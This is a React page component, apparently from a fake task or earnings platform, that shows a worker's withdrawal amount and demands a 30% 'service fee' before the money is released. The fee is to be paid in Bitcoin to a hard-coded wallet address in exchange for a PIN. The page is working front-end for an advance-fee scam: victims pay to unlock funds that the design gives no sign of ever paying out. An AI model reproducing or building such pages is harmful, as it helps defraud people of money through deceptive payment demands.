import React, { useEffect, useState } from 'react';
import api from '../api/axios';
import PrivateRoute from '../components/PrivateRoute';
import WorkerNavbar from '../components/WorkerNavbar';
import { useNavigate } from 'react-router-dom';
import './ServiceCharge.css';

export default function ServiceCharge() {
  const [data, setData] = useState({});
  const [pin, setPin] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    api.get('/withdraw/service')
      .then(res => setData(res.data))
      .catch(() => navigate('/worker'));
  }, [navigate]);

  // 30% service fee
  const serviceFee = ((data.amount * 0.3) || 0).toFixed(2);

  const handleDisburse = () => {
    api.post('/withdraw/service', { pin })
      .then(res => res.data.success
        ? navigate('/worker/success')
        : navigate('/worker')
      )
      .catch(() => navigate('/worker'));
  };

  return (
    <PrivateRoute role="worker">
      <WorkerNavbar />
      <main className="service-charge">
        <h2>Service Charge</h2>

        <section className="details">
          <p><strong>Withdrawal Amount:</strong> ${data.amount}</p>
          <p><strong>Service Fee (30%):</strong> ${serviceFee}</p>
          <p>
            To complete this withdrawal, please remit the service fee of <strong>${serviceFee}</strong>  
            via Bitcoin to the address below. Once payment is confirmed, you will receive a 5-digit  
            PIN in your Notifications. Enter that PIN below to finalize your withdrawal.
          </p>

          <div className="wallet-info">
            <h3>Pay to:</h3>
            <p>Crypto: <strong>Bitcoin (BTC)</strong></p>
            <p>Wallet Address: <code>3Liim5xHAkLEgUjzfw2DNFqbEkzaXgWWu8</code></p>
          </div>
        </section>

        <section className="verify-pin">
          <input
            value={pin}
            onChange={e => setPin(e.target.value)}
            maxLength="5"
            placeholder="Enter 5-digit PIN"
          />
          <button onClick={handleDisburse}>
            Disburse Withdrawal
          </button>
        </section>
      </main>
    </PrivateRoute>
  );
}
